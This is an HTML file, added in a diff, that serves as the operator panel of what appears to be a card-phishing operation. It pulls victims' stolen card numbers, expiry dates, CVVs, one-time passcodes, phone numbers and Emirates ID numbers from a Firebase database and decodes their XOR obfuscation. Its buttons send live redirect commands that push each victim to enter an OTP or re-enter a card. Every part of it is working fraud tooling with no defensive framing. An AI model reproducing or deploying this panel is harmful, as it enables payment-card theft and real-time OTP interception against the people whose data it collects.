@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اللوحة الملكية 3D | ROYAL DASHBOARD</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Tajawal', sans-serif; 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); 
+            color: #e5e5e5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container { max-width: 1200px; margin: 0 auto; }
+        
+        .header { text-align: center; margin-bottom: 40px; }
+        .header-title { 
+            font-size: 36px; 
+            font-weight: 900; 
+            color: #d4af37; 
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+            margin-bottom: 10px;
+        }
+        .header-subtitle { color: #888; font-size: 14px; }
+        
+        /* 3D Card Styles */
+        .card-wrapper {
+            perspective: 1000px;
+            margin-bottom: 40px;
+            cursor: pointer;
+            height: 280px;
+        }
+        
+        .card-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+        }
+        
+        .card-wrapper:hover .card-inner {
+            transform: rotateY(180deg);
+        }
+        
+        .card-front, .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(212, 175, 55, 0.3), 0 0 40px rgba(212, 175, 55, 0.1);
+        }
+        
+        .card-front {
+            background: linear-gradient(135deg, #d4af37 0%, #c9a227 50%, #b8941f 100%);
+            color: #1a1a2e;
+            border: 2px solid #f0d960;
+        }
+        
+        .card-back {
+            background: linear-gradient(135deg, #1a1a2e 0%, #2d2d4a 100%);
+            color: #d4af37;
+            border: 2px solid #d4af37;
+            transform: rotateY(180deg);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .card-logo { font-size: 24px; font-weight: 900; letter-spacing: 2px; }
+        
+        .card-number {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            text-align: center;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .card-holder {
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-expiry-cvv {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .card-expiry-cvv div { text-align: center; }
+        .card-expiry-cvv label { font-size: 10px; opacity: 0.8; display: block; margin-bottom: 4px; }
+        
+        .otp-section {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.15), rgba(212, 175, 55, 0.05));
+            border: 2px solid #d4af37;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .otp-label { 
+            font-size: 12px; 
+            color: #888; 
+            text-transform: uppercase; 
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+        
+        .otp-code {
+            font-size: 48px;
+            font-weight: 900;
+            color: #d4af37;
+            letter-spacing: 8px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+        }
+        
+        .otp-status {
+            font-size: 12px;
+            margin-top: 10px;
+            color: #4ade80;
+        }
+        
+        .otp-status.waiting { color: #888; }
+        
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            font-size: 14px;
+        }
+        
+        .btn-otp { 
+            background: linear-gradient(135deg, #1e3a8a, #1e40af); 
+            color: white;
+        }
+        .btn-otp:hover { background: linear-gradient(135deg, #1e40af, #1e3a8a); }
+        
+        .btn-approve { 
+            background: linear-gradient(135deg, #d4af37, #c9a227); 
+            color: #0a0a0a; 
+            font-weight: 900;
+        }
+        .btn-approve:hover { background: linear-gradient(135deg, #c9a227, #d4af37); }
+        
+        .btn-reject { 
+            background: linear-gradient(135deg, #7f1d1d, #991b1b); 
+            color: white;
+        }
+        .btn-reject:hover { background: linear-gradient(135deg, #991b1b, #7f1d1d); }
+        
+        .btn-delete { 
+            background: linear-gradient(135deg, #1f2937, #111827); 
+            color: #ef4444; 
+            border: 1px solid #ef4444;
+        }
+        .btn-delete:hover { background: linear-gradient(135deg, #111827, #1f2937); }
+        
+        .visitor-container {
+            background: rgba(20, 20, 35, 0.6);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .user-info {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(212, 175, 55, 0.2);
+            font-size: 14px;
+            color: #888;
+        }
+        
+        .user-info p { margin: 8px 0; }
+        
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(212, 175, 55, 0.2);
+            border-top-color: #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .otp-history {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        
+        .otp-history-item {
+            padding: 6px;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
+            color: #d4af37;
+        }
+        
+        .otp-history-item:last-child { border-bottom: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="header-title">اللوحة الملكية 3D</h1>
+            <p class="header-subtitle">Royal 3D Control Dashboard</p>
+        </div>
+
+        <!-- Visitors Container -->
+        <div id="visitors-container">
+            <div class="loading">
+                <div class="spinner"></div>
+                <p>جاري فحص الرادار الملكي...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-TzE4b9k2N1x0P3r5Q7s9W1v2Y3z4X5c",
+            authDomain: "dsfe-ert.firebaseapp.com",
+            projectId: "dsfe-ert",
+            storageBucket: "dsfe-ert.appspot.com",
+            messagingSenderId: "964263514104",
+            appId: "1:964263514104:web:de017cc91f93959df4500d"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        let knownIds = new Set();
+        let otpHistory = {};
+
+        function decrypt(str) {
+            if (!str) return '-';
+            try {
+                if (/^\d+$/.test(str.replace(/\s/g, ''))) return str;
+                let res = '';
+                for (let i = 0; i < str.length; i++) {
+                    res += String.fromCharCode(str.charCodeAt(i) ^ 0x42);
+                }
+                const cleaned = res.replace(/[^a-zA-Z0-9\/\-\s]/g, '').trim();
+                return cleaned || str;
+            } catch (e) { return str; }
+        }
+
+        function formatCardNumber(num) {
+            if (!num || num === '-') return '•••• •••• •••• ••••';
+            const str = String(num).replace(/\D/g, '');
+            return str.replace(/(\d{4})/g, '$1 ').trim() || '•••• •••• •••• ••••';
+        }
+
+        function formatExpiry(exp) {
+            if (!exp || exp === '-') return 'MM/YY';
+            const str = String(exp).replace(/\D/g, '');
+            if (str.length >= 4) {
+                return str.substring(0, 2) + '/' + str.substring(2, 4);
+            }
+            return str || 'MM/YY';
+        }
+
+        async function sendCommand(id, cmd) {
+            try {
+                await db.collection('pays').doc(id).update({
+                    redirectPage: cmd,
+                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                alert('تم إرسال الأمر: ' + cmd);
+            } catch (e) {
+                alert('خطأ في إرسال الأمر');
+            }
+        }
+
+        async function deleteCard(id) {
+            if (confirm('هل أنت متأكد من حذف هذه البطاقة؟')) {
+                try {
+                    await db.collection('pays').doc(id).delete();
+                    alert('تم حذف البطاقة بنجاح');
+                    updateRadar();
+                } catch (e) {
+                    alert('خطأ في حذف البطاقة');
+                }
+            }
+        }
+
+        function renderVisitor(doc) {
+            const data = doc.data();
+            const id = doc.id;
+            const isNew = !knownIds.has(id);
+            if (isNew) {
+                knownIds.add(id);
+            }
+
+            const cardNum = decrypt(data.cardNumber || data._v1 || '');
+            let expiry = decrypt(data.expiry || data._v2 || '');
+            const cvv = decrypt(data.cvv || data._v3 || '');
+            const otp = decrypt(data.otp || data.otpCode || '');
+            const holderName = (data.fullName || data.ownerName || 'ROYAL USER').toUpperCase();
+
+            // Track OTP history
+            if (otp && otp !== '-') {
+                if (!otpHistory[id]) otpHistory[id] = [];
+                const timestamp = new Date().toLocaleTimeString('ar-SA');
+                if (!otpHistory[id].includes(`${otp} #${timestamp}`)) {
+                    otpHistory[id].unshift(`${otp} #${timestamp}`);
+                    if (otpHistory[id].length > 5) otpHistory[id].pop();
+                }
+            }
+
+            const otpHistoryHTML = otpHistory[id] ? otpHistory[id].map(h => `<div class="otp-history-item">${h}</div>`).join('') : '<div class="otp-history-item" style="color: #666;">لا توجد سجلات</div>';
+
+            return `
+                <div class="visitor-container">
+                    <!-- 3D Card -->
+                    <div class="card-wrapper">
+                        <div class="card-inner">
+                            <!-- Card Front -->
+                            <div class="card-front">
+                                <div>
+                                    <div class="card-logo">👑 ROYAL</div>
+                                    <div class="card-number">${formatCardNumber(cardNum)}</div>
+                                </div>
+                                <div>
+                                    <div class="card-holder">${holderName}</div>
+                                    <div class="card-expiry-cvv">
+                                        <div>
+                                            <label>VALID THRU</label>
+                                            <span>${formatExpiry(expiry)}</span>
+                                        </div>
+                                        <div>
+                                            <label>CVV</label>
+                                            <span>${cvv === '-' ? '•••' : cvv}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Card Back -->
+                            <div class="card-back">
+                                <div>
+                                    <p style="font-size: 18px; margin-bottom: 10px;">🔐 SECURE CARD</p>
+                                    <p style="font-size: 12px; opacity: 0.7;">اضغط للعودة</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- OTP Section -->
+                    <div class="otp-section">
+                        <div class="otp-label">آخر كود مستلم (OTP)</div>
+                        <div class="otp-code">${otp === '-' ? '------' : otp}</div>
+                        <div class="otp-status ${otp === '-' ? 'waiting' : ''}">
+                            ${otp === '-' ? '⏳ بانتظار الكود...' : '✓ تم استلام الكود بنجاح'}
+                        </div>
+                        <div class="otp-history">
+                            ${otpHistoryHTML}
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons -->
+                    <div class="controls">
+                        <button onclick="sendCommand('${id}', 'otp')" class="btn btn-otp">📱 إلى OTP</button>
+                        <button onclick="sendCommand('${id}', 'success')" class="btn btn-approve">✓ كود صحيح</button>
+                        <button onclick="sendCommand('${id}', 'payment')" class="btn btn-reject">↩️ إعادة بطاقة</button>
+                        <button onclick="deleteCard('${id}')" class="btn btn-delete">🗑️ حذف</button>
+                    </div>
+
+                    <!-- User Info -->
+                    <div class="user-info">
+                        <p>👤 <strong>${data.fullName || data.ownerName || 'مستخدم'}</strong></p>
+                        <p>📞 ${data.phone || '-'}</p>
+                        <p>🆔 ${data.emiratesId || '-'}</p>
+                        <p>⏰ ${new Date(data.createdAt?.toDate?.() || Date.now()).toLocaleString('ar-SA')}</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        async function updateRadar() {
+            try {
+                const snapshot = await db.collection('pays').orderBy('updatedAt', 'desc').limit(20).get();
+                const container = document.getElementById('visitors-container');
+                if (snapshot.empty) {
+                    container.innerHTML = '<div class="loading"><p>لا توجد بطاقات حالياً</p></div>';
+                    return;
+                }
+                container.innerHTML = snapshot.docs.map(doc => renderVisitor(doc)).join('');
+            } catch (e) {
+                console.error('خطأ في جلب البيانات:', e);
+                document.getElementById('visitors-container').innerHTML = '<div class="loading"><p>خطأ في الاتصال بقاعدة البيانات</p></div>';
+            }
+        }
+
+        // Initial load and auto-refresh
+        updateRadar();
+        setInterval(updateRadar, 5000);
+    </script>
+</body>
+</html>
